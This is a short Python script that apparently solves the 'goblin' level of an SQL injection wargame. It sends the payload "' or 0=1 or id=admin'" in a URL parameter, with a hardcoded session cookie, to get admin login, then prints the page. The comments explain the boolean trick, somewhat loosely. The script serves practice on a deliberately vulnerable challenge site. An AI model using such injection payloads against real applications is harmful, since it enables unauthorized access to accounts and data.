#!/usr/bin/python3

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt

url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php"
parameter = 'no'
cookie = dict(PHPSESSID='nll8p4tb7nbhffh8a2qr1sf8sk')

# This makes sure that id is admin. if id='' or 1=1 returns boolean value true which does not specify user.
# to make sure login as admin, id=admin' and 1=1 -> admin^true = 1 thefore, it is true and admin
sqli = "' or 0=1 or id=admin'"

query_url = "%s?%s=%s" % (url,parameter,sqli)

print(query_url)
http_request = requests.get(query_url,cookies=cookie)
response_text = bs(http_request.text,"html.parser").prettify()

print(response_text)